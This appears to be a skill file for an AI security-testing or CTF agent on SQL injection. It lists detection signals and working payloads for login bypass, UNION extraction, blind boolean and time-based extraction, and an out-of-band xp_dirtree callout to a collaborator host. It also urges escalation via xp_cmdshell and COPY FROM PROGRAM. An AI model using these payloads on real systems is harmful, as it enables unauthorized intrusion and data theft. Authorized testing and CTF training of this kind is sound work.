# sqli — when to use

SQL injection: any user input that reaches a database query unsafely — value
position (`WHERE id=$input`), identifier position (`ORDER BY`), auth lookups,
or a backend filter object behind GraphQL/REST/JSON. Detection is usually the
easy part; the win is carrying through to extraction. Confirming a differential
is the START of the work, not the end — do not stop at "oracle confirmed".

## Trigger signals (dispatch the moment you observe…)

- **A single quote breaks the response.** Appending `'` flips a `200` into a
  `500`, an empty page, a stack trace, or a different result set — and the
  escaped `''` (or `%27%27`) restores normal behaviour. That round-trip is the
  canonical SQLi tell.
- **A DB error string leaks in the body.** Any of: `You have an error in your
  SQL syntax`, `Unclosed quotation mark after the character string`,
  `quoted string not properly terminated`, `Fatal error: Uncaught
  mysqli_sql_exception`, `Warning: mysqli_`, `SQLite3::SQLException` /
  `SQLITE_ERROR`, `PG::SyntaxError` / `pq: …`, `ORA-00933` / `ORA-…`,
  `Microsoft OLE DB Provider for SQL Server`, `Conversion failed when
  converting`, `near "…": syntax error`. A DBMS naming itself is the strongest
  free fingerprint — **but read the error class first** (a *constraint* error
  on a prepared statement is not injection; see "When NOT to use it").
- **A login form whose failure path is a redirect, not an error.** A POST to a
  login (`username`/`password`) that returns `302 Found` →
  `Location: index.php?error=failed_login` for bad creds gives a ready-made
  boolean oracle: a successful bypass redirects elsewhere (e.g. `dashboard.php`).
  Test `admin' -- `, `' OR '1'='1' -- ` in the username field and diff the
  `Location` header — the differential is in the header, not the body.
- **A search/lookup parameter that echoes a content-based true/false signal.**
  Same HTTP 200, but a measurable content/length difference keyed on the input:
  e.g. `User exists: admin` (longer body) for one value vs `No results`
  (shorter body) for another. That is a blind boolean oracle — extract.
- **A list/category/filter parameter whose row count changes with a tautology.**
  `?category=Nature' OR '1'='1'-- ` returns *more* rows than `' OR '1'='2'-- `,
  or a UNION changes the rendered list → injected straight into a `WHERE` clause.
- **A `Content-Length` boolean differential under `AND 1=1` / `AND 1=2`.**
  `category=Tech' AND 1=1#` → longer body, `AND 1=2#` → shorter (true longer
  than false) confirms a blind oracle with no visible error → move to UNION
  column-count enumeration.
- **A numeric-looking parameter responds to arithmetic.** `id=5` and `id=4+1`
  (or `id=6-1`) return the *same* record while `id=5'` errors → value
  concatenated unquoted. Same logic for `id=5-0` vs `id=5-(SELECT 1)`.
- **Boolean tautology vs contradiction diverge.** `x=1' OR '1'='1` returns rows
  / login succeeds while `x=1' AND '1'='2` returns nothing / login fails →
  predicate is evaluated by a DB engine.
- **A `sort`/`order` parameter takes a column name.** `?sort=name` vs
  `?sort=price` reorders results. `ORDER BY` cannot be parameterised in most
  stacks → high-yield injection point even otherwise-safe apps miss.
- **Listing/search/filter endpoints by name.** Any URL with `id`, `pid`, `uid`,
  `cat`, `category`, `product`, `order`, `sort`, `orderby`, `dir`, `filter`,
  `search`, `q`, `page`, `limit`, `offset`, `from`, `to`, `start_date` is a
  default candidate — these feed `WHERE`, `ORDER BY`, or `LIMIT`.
- **Login / auth forms.** A username or password field is a first-class target —
  try this before assuming creds are needed. `' OR 1=1 --` / `admin'-- ` is the
  cheapest possible win, and a login is more likely injectable than brute-forceable.
- **Response timing tracks an injected sleep.** Baseline ~80 ms;
  `x=1' AND SLEEP(5)--` (MySQL) / `' OR pg_sleep(5)--` (Postgres) /
  `'; WAITFOR DELAY '0:0:5'--` (MSSQL) returns at ~5 s, repeatably, while
  `SLEEP(0)` returns fast → time-based blind confirmed. Use when there is no
  visible error and no body diff.
- **`some item is filtered!` / WAF or allowlist rejection of `OR`/`UNION`/`--`.**
  A parameter that otherwise behaves like an oracle returns a short "filtered"
  response only when the payload contains SQL keywords → positive evidence of a
  SQL-backed sink *plus* a keyword filter. Pivot to bypass encodings, not away
  from the surface.
- **Stored value re-renders differently in another view.** A name/comment/profile
  field saved on page A that later throws a SQL error when rendered on page B →
  second-order SQLi.
- **Recon fingerprints a relational DB.** Banners/tech showing
  MySQL/MariaDB, PostgreSQL, MSSQL, Oracle, SQLite behind a PHP/Java/.NET/Node
  app with dynamic content → the backend talks SQL; probe every input.
- **A GraphQL argument that takes a free-form string into a query.** If
  introspection shows a field like `jobs(type: String)` / `users(search: String)`
  whose argument flows to a filter, treat the argument as injectable: classic
  SQLi if the backend is relational; NoSQL/operator injection if the argument
  parses as a JSON filter object (`search:"{}"` returns all rows,
  `search:"{\"is_admin\": true}"` filters them).
- **Parameter shapes that scream raw SQL fragments.** A WHERE/filter object in
  JSON, GraphQL `filter:`/`where:`/`orderBy:` args, a query builder behind
  `whereRaw`/`orderByRaw`/`$queryRawUnsafe`/`sequelize.literal`, or a
  report/export endpoint embedding filters → classic concatenation sinks.
- **An objective phrased as "login as admin", "dump the admins table", "find the
  secret/hidden category", "forgot the password".** These describe extracting
  rows the UI deliberately hides — the SQLi win condition. The
  "list-that-hides-rows" framing is itself a routing tell.

## Use-case scenarios

- **First-pass parameter sweep on any data-backed app.** As soon as you have a
  crawl/param list (manually or via arjun/hakrawler), give every GET/POST
  parameter, every cookie, and injectable headers (User-Agent, Referer,
  X-Forwarded-For when logged) a quote/arithmetic/boolean probe. High-impact,
  cheap to test — belongs early on anything with a database.
- **Authentication bypass (auth-on-SQL).** The backend builds a raw
  `SELECT … WHERE username='$u' AND password='$p'` and a tautology in the
  username comments out the password check. The tell is a *binary* outcome
  surface: failure-redirect vs success-redirect. Try tautologies and
  comment-truncation here before chasing credential attacks; right move whenever
  a login is the only interactive surface and credential-guessing has failed.
- **Blind boolean / content-based extraction.** The page never prints SQL output
  or errors, but a parameter changes the rendered text or body length on a
  true/false condition. Build a true/false oracle from the content delta, then
  extract the flag character-by-character (`SUBSTR`, `ASCII`, `CASE WHEN`).
- **UNION-based exfiltration / column enumeration.** A list view renders query
  rows, so a `UNION SELECT` with the right column count injects chosen rows into
  the page. Workflow: confirm injection → enumerate column count
  (`UNION SELECT NULL,NULL,…` until it renders, or `ORDER BY n` until it errors)
  → map which columns print → `UNION SELECT` the admin/flag column. The
  systematic `C1,C2,C3,…,C7` column-probe to locate printed columns is canonical.
- **Identifier-position injection.** `ORDER BY`, `GROUP BY`, column/table
  selectors driven by `sort=`/`groupby=`/`col=` cannot use bound parameters, so
  they leak in apps otherwise careful with value placeholders. High-value,
  under-tested. Boolean oracle in identifier position:
  `?sort=(CASE WHEN (1=1) THEN name ELSE price END)` reorders conditionally.
- **ORM / query-builder edges.** Apps that look "safe" still route a sliver of
  input through `whereRaw`, `orderByRaw`, `$queryRawUnsafe`, `sequelize.literal`,
  raw HQL/JPQL, or string-interpolated `LIKE`/`IN` lists. With a framework stack
  (Prisma, Sequelize, TypeORM, Knex, Hibernate, Django `.extra()`/`RawSQL`),
  still test — partial parameterisation leaves operators and lists unbound.
- **APIs with structured filters.** REST bodies with
  `{"filter": {…}, "sort": "…"}`, GraphQL resolvers, and WebSocket payloads
  driving a query layer. Injection is the same; only the transport differs.
- **GraphQL-fronted injection.** A `/graphql/` endpoint is not its own vuln —
  introspect it, find which argument is a free-form string, and inject there.
  Relational backend → classic SQLi on the argument. Mongo-style backend → NoSQL
  operator injection where the argument is a JSON filter (`$ne`, `$gt`,
  `is_admin: true`) tampered to widen the result set and reveal hidden rows.
- **Hidden-row disclosure ("the list that omits the admin").** When the UI shows
  a list that deliberately excludes a privileged record (admin user, "secret"
  category, "private"/"hidden" job), break the filter so hidden rows render.
- **Blind-only targets.** Generic 200/302, no error text, no obvious body diff,
  but content/behaviour shifts on true/false predicates or timing responds to
  `SLEEP`/`pg_sleep`/`WAITFOR`. Carry boolean-bit-extraction and
  time-gated-subquery techniques to pull data with no visible channel.
- **Post-injection extraction and pivot.** Once confirmed, own the follow-through:
  fingerprint the DBMS, enumerate schema, dump target tables, and — where the DB
  allows it — escalate (file read/write, `xp_cmdshell`,
  `COPY … FROM PROGRAM`, cloud metadata reads).

## Concrete tells (request → response examples)

- **Quote breakage:** `GET /item?id=10'` → `500` + `You have an error in your
  SQL syntax; check the manual … near '''` → injectable, DBMS = MySQL/MariaDB.
- **Arithmetic equivalence (numeric, unquoted):** `id=10` → product #10;
  `id=11-1` → still #10; `id=10'` → error → `… WHERE id = $input` unquoted.
- **Boolean differential:** `?q=widget' AND 1=1-- -` → normal results;
  `?q=widget' AND 1=2-- -` → zero results / different page length.
- **Login boolean via redirect:** `POST /index.php username=admin&password=x` →
  `302`, `Location: index.php?error=failed_login`; a bypass
  (`username=admin' -- `) changes that `Location`.
- **Login tautology:** `POST /login user=admin'-- &pass=x` → authenticated as
  admin (`--` comments out the password check).
- **Content-based blind oracle:** `POST /search.php username=admin` → `200`,
  body `User exists: admin` (e.g. `len 385`); `username=nobody` → `200`,
  `No results` (e.g. `len 372`) — same status, body length is the oracle.
  `username=' OR '1'='1'-- ` → `some item is filtered!` (`len 77`) = the keyword
  filter, not absence of the bug.
- **Boolean row-count on a list param:** `?category=Nature' OR '1'='1'-- `
  returns more entries than `' OR '1'='2'-- `; pushing the condition exposes the
  hidden `Secret` category posts whose body contains `FLAG{…}`.
- **Length boolean + UNION:** `?category=Tech' AND 1=1#` → longer;
  `AND 1=2#` → shorter. Then `?category=x' UNION SELECT 'flag{probe}'#` confirms
  a printed column; swap in `database()` / the admin column to exfiltrate.
- **UNION column probe / map:** `?id=1 ORDER BY 5-- -` → OK, `ORDER BY 6-- -` →
  `Unknown column '6' in 'order clause'` → 5 columns. `?id=-1 UNION SELECT
  1,2,3,4,5-- -` reflects `2`/`3` → channel open. Or
  `?category=' UNION SELECT 'C1','C2',…,'C7' -- -` renders the markers in
  whichever columns the page prints, pinpointing where to place the admin/flag
  value.
- **Time-based blind (no visible output):** `?id=1' AND SLEEP(5)-- -` returns at
  ~5.0 s; `SLEEP(0)` fast; repeatable → time-based blind, MySQL. Postgres:
  `1; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END-- -`.
- **Out-of-band:** `?id=1; exec master..xp_dirtree
  '\\\\abc.<collab-id>.oast.site\\a'-- -` produces a DNS hit on your collaborator
  with no in-band response → blind OOB confirmed, DBMS = MSSQL.
- **GraphQL argument injection:** introspect `/graphql/`, find
  `jobs(type: …)` / `users(search: …)`. Inject the relational argument to render
  a hidden job (`"type": "private", "description": "FLAG{…}"`); or for NoSQL,
  `users(search:"{}")` → all rows and `users(search:"{\"is_admin\": true}")` →
  filtered, dumping the `admin` row whose `flag` field renders `FLAG{…}`.

## When NOT to use it / easily-confused-with

- **A DB error from a *constraint*, not broken query structure, is not
  injection.** `mysqli_sql_exception: Data too long for column 'subject'` thrown
  from `mysqli_stmt->execute()` (a prepared statement) means the input was bound
  safely and only violated a column limit. The placeholder is parameterised —
  stop hammering that parameter; the real SQLi sink is likely a different one.
- **Reflected input that is never queried → XSS,** not SQLi. A value echoed into
  HTML/JS/attribute context that changes the *rendered page* (and produces broken
  markup, not a SQL error) with body length tracking only the literal you sent.
  SQLi requires the value to alter a query result (row count, content delta,
  error, or timing).
- **Input evaluated as a template → SSTI,** not SQLi. `{{7*7}}` rendering as
  `49`, or `${…}`/`#{…}` expression evaluation. It is SSTI only if *evaluated*.
- **Input that lands in an OS command → command injection.** Shell metacharacters
  (`;`, `|`, `` ` ``, `$( )`) triggering command behaviour, not quote-driven SQL
  errors.
- **A `url`/`uri`/`callback`/`webhook` parameter that fetches a resource → SSRF.**
  The tell is outbound request behaviour, not a query.
- **A `file`/`path`/`page`/`include`/`template` parameter returning file contents
  or `/etc/passwd` on `../` traversal → LFI/path traversal.**
- **Swappable object/record IDs reading another user's data with no quote
  breakage → IDOR/access control.** `id=123` → `id=124` returning another user's
  record is an authorization flaw; treat as SQLi only if quote/arithmetic/boolean
  probes also perturb the query.
- **NoSQL / non-relational stores.** Mongo operator injection
  (`username[$ne]=`, JSON `$ne`/`$gt`/`is_admin: true`), Cypher/Neo4j, Redis. This
  skill carries the operator probes so it is still the right dispatch, but classic
  SQL payloads (`UNION SELECT`, `SLEEP`, `-- ` comments) do not apply — switch to
  operator-injection idioms.
- **A co-located decoy service on an odd port (e.g. `:4455`/`:8765`/random high
  ports) is almost always a distraction, not the SQL surface.** Do not let an
  unidentified open port (SSRF oracle, `{{7*7}}` marker, raw TCP) pull this skill
  away from the login/search/category parameter on the main app (`:80`).
- **A `Connection reset by peer` / empty homepage is a recon problem, not "no
  vuln".** If the front page resets bare requests, fix the request shape (browser
  headers, vhost, path enumeration — the login form may sit at `/login.php`)
  before concluding there is no injectable surface.
- **Generic 500s, static templated response sizes, and network/CPU jitter are
  false positives.** A `500` that fires on *any* malformed input (not just an
  unbalanced quote), a body length fixed by templating regardless of predicate
  truth, or a one-off slow request that does not track `SLEEP(n)`. Require an
  oracle that *flips when you toggle the predicate* and reproduces.
